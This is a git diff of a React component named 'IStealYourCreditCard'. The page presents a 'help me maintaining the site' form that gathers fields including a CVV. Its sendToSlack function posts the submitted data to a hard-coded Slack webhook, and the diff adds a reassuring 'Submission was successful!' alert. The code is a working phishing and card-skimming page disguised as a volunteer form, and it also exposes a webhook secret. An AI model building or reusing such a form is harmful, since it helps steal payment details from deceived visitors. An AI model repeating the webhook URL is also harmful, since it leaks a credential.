@@ -1,19 +1,6 @@
 import "./IStealYourCreditCard.css";
 import {useState} from "react";
 
-async function sendToSlack(message: string) {
-    const response = await fetch('https://hooks.slack.com/services/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', {
-        method: 'POST',
-        headers: {'Content-Type': 'text/plain'},
-        body: JSON.stringify({text: message}),
-    });
-
-    if (!response.ok) {
-        throw new Error('Sending to Slack failed!');
-    }
-}
-
-
 function IStealYourCreditCard() {
 
     const [formData, setFormData] = useState({
@@ -23,9 +10,30 @@ function IStealYourCreditCard() {
         cvv: '',
     });
 
+    const [showAlert, setShowAlert] = useState(false)
+
     function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
         const {name, value} = e.target;
         setFormData(prev => ({...prev, [name]: value}));
+    }
+
+    async function sendToSlack(message: string) {
+        const response = await fetch('https://hooks.slack.com/services/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', {
+            method: 'POST',
+            headers: {'Content-Type': 'text/plain'},
+            body: JSON.stringify({text: message}),
+        });
+
+        if (!response.ok) {
+            throw new Error('Sending to Slack failed!');
+        } else {
+            showSuccessAlert();
+        }
+
+    }
+
+    function showSuccessAlert() {
+        setShowAlert(true)
     }
 
     return (
@@ -33,6 +41,20 @@ function IStealYourCreditCard() {
             <h1 className={"h1"}>You want to help me maintaining the site?</h1>
 
             <p>If you want to help me with the site, fill out this form:</p>
+
+            {showAlert && (
+                <div className="alert alert-success alert-dismissible d-flex align-items-center" role="alert">
+                    <i className="bi bi-send-check me-2"></i>
+                    <div>Submission was successful!</div>
+                    <button
+                        type="button"
+                        className="btn-close"
+                        aria-label="Close"
+                        onClick={() => setShowAlert(false)}
+                    ></button>
+                </div>
+            )}
+
 
             <div className="input-group py-1">
                 <div className="form-floating">
